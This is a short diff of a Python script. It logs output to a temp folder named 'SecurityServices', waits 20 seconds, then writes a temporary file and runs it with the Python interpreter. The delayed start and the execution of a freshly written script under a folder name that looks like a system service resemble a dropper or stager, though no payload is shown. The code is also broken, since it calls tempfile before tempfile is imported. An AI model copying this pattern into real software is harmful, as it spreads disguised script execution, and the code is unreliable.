@@ -1,9 +1,10 @@
 import sys, os
 
-if sys.stdout is None:
-    sys.stdout = open(os.devnull, "w")
-if sys.stderr is None:
-    sys.stderr = open(os.devnull, "w")
+log_dir = os.path.join(tempfile.gettempdir(), "SecurityServices")
+os.makedirs(log_dir, exist_ok=True)
+log_path = os.path.join(log_dir, "debug.log")
+sys.stdout = open(log_path, "a", buffering=1)
+sys.stderr = sys.stdout
 
 import time
 time.sleep(20)
@@ -34,6 +35,6 @@ with tempfile.NamedTemporaryFile(
     temp_path = pathlib.Path(f.name)
 
 subprocess.run(
-    [sys.executable.replace("pythonw.exe", "python.exe"), str(temp_path)],
+    [sys.executable, str(temp_path)],
     check=True
 )
